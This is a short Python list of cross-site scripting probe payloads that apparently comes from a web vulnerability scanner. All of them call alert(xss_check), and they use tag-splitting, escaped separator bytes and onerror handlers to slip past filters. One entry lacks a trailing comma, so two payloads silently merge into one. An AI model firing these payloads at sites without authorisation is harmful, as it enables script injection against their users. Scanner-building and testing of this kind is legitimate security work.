payloads = [
"</scrip</script>t><img src =q onerror=alert(xss_check)>",
'<script\x20type="text/javascript">javascript:alert(xss_check);</script>',
'<script\x3Etype="text/javascript">javascript:alert(xss_check);</script>',
'<script\x0Dtype="text/javascript">javascript:alert(xss_check);</script>',
'<script\x09type="text/javascript">javascript:alert(xss_check);</script>',
'<script\x0Ctype="text/javascript">javascript:alert(xss_check);</script>',
'<script\x2Ftype="text/javascript">javascript:alert(xss_check);</script>',
'<script\x0Atype="text/javascript">javascript:alert(xss_check);</script>'
'<img src=1 href=1 onerror="javascript:alert(xss_check)"></img>',
'<audio src=1 href=1 onerror="javascript:alert(xss_check)"></audio>',
'<video src=1 href=1 onerror="javascript:alert(xss_check)"></video>',
'<body src=1 href=1 onerror="javascript:alert(xss_check)"></body>',
'<image src=1 href=1 onerror="javascript:alert(xss_check)"></image>',
'<object src=1 href=1 onerror="javascript:alert(xss_check)"></object>',
'<script src=1 href=1 onerror="javascript:alert(xss_check)"></script>',
'<svg onResize svg onResize="javascript:javascript:alert(xss_check)"></svg onResize>'
]